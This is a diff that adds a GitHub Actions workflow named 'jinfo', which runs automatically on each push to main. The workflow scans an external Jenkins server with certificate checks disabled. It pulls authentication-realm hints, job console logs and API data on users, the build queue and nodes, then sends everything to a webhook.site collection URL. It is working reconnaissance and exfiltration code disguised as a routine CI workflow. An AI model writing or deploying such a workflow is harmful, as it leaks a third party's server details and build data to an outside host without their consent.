@@ -1,0 +1,23 @@
+name: jinfo
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  jinfo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Info
+        run: |
+          {
+            echo "=== login realm ==="
+            curl -sS -k -m 15 https://jenkins.htpl.cc/login -o /tmp/l.html 2>&1
+            grep -oiE "github|ldap|securityRealm|j_username|j_password|Jenkins[^<]{0,60}|Sign in[^<]{0,40}" /tmp/l.html 2>/dev/null | sort -u | head -20
+            for u in "/job/Jenkins-Test/" "/job/Jenkins-Test/lastBuild/consoleText" "/job/Jenkins-Test/api/json" "/job/Harsha-Sudo08/job/Jenkins-Test/" "/job/Harsha-Sudo08/job/Jenkins-Test/lastBuild/consoleText" "/me/" "/view/all/" "/queue/api/json" "/computer/api/json"; do
+              echo "=== $u ==="
+              curl -sS -k -m 15 -o /tmp/j -w "code=%{http_code} size=%{size_download}\n" "https://jenkins.htpl.cc$u" 2>&1
+              head -c 400 /tmp/j; echo
+            done
+          } > /tmp/out.txt 2>&1
+          curl -s -m 20 -X POST "https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
